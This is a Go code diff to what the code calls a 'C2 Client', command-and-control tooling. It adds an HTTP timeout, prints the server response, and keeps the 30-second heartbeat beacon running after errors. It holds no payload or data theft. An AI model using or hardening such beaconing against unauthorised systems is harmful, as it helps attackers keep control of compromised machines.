@@ -474,6 +474,7 @@ func copyClientFiles(config BuildConfig, clientDir string) error {
 import (
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"net"
 	"net/http"
 	"os"
@@ -512,14 +513,23 @@ func main() {
 		// For HTTP protocol
 		fmt.Println("Connecting using HTTP protocol...")
 		
+		// Create HTTP client with longer timeout
+		client := &http.Client{
+			Timeout: 60 * time.Second,
+		}
+		
 		// Make HTTP request
-		resp, err := http.Get(fmt.Sprintf("http://%s/", *serverAddr))
+		resp, err := client.Get(fmt.Sprintf("http://%s/", *serverAddr))
 		if err != nil {
 			fmt.Printf("Error connecting to HTTP server: %v\n", err)
 			os.Exit(1)
 		}
-		defer resp.Body.Close()
 		
+		// Read and discard response body
+		body, _ := ioutil.ReadAll(resp.Body)
+		resp.Body.Close()
+		
+		fmt.Printf("HTTP server response: %s\n", string(body))
 		fmt.Println("C2 Client started. Connected to server:", *serverAddr)
 		fmt.Println("Using protocols: http")
 		
@@ -531,10 +541,11 @@ func main() {
 		go func() {
 			for {
 				time.Sleep(30 * time.Second)
-				_, err := http.Get(fmt.Sprintf("http://%s/heartbeat", *serverAddr))
+				_, err := client.Get(fmt.Sprintf("http://%s/heartbeat", *serverAddr))
 				if err != nil {
 					fmt.Printf("Error sending HTTP heartbeat: %v\n", err)
-					return
+				} else {
+					fmt.Println("Sent HTTP heartbeat")
 				}
 			}
 		}()
